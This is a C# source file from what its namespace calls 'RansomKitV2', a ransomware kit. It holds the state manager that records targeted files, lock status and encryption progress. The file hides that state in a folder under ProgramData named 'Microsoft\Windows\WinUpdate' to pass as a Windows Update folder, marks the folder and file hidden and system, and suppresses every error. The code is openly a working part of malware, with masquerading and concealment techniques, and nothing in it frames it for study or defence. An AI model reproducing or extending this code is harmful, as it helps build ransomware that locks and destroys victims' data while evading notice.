using System;
using System.Collections.Generic;
using System.IO;
using System.Text.Json;

namespace RansomKitV2
{
    public class StateData
    {
        public List<string> Files { get; set; } = new();
        public List<string> Paths { get; set; } = new();
        public bool Locked { get; set; }
        public bool EncryptionCompleted { get; set; }
        public int Attempts { get; set; }
    }

    public static class StateManager
    {
        private static readonly string StateDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            @"Microsoft\Windows\WinUpdate");

        private static readonly string StateFile = Path.Combine(StateDir, "state.dat");

        public static void Save(StateData data)
        {
            try
            {
                if (!Directory.Exists(StateDir))
                {
                    Directory.CreateDirectory(StateDir);
                    var di = new DirectoryInfo(StateDir);
                    di.Attributes |= FileAttributes.Hidden | FileAttributes.System;
                }

                string json = JsonSerializer.Serialize(data);
                File.WriteAllText(StateFile, json);

                var fi = new FileInfo(StateFile);
                fi.Attributes |= FileAttributes.Hidden | FileAttributes.System;
            }
            catch { }
        }

        public static StateData? Load()
        {
            try
            {
                if (!File.Exists(StateFile)) return null;
                string json = File.ReadAllText(StateFile);
                return JsonSerializer.Deserialize<StateData>(json);
            }
            catch { return null; }
        }

        public static void Clear()
        {
            try
            {
                if (File.Exists(StateFile))
                {
                    File.SetAttributes(StateFile, FileAttributes.Normal);
                    File.Delete(StateFile);
                }
            }
            catch { }
        }
    }
}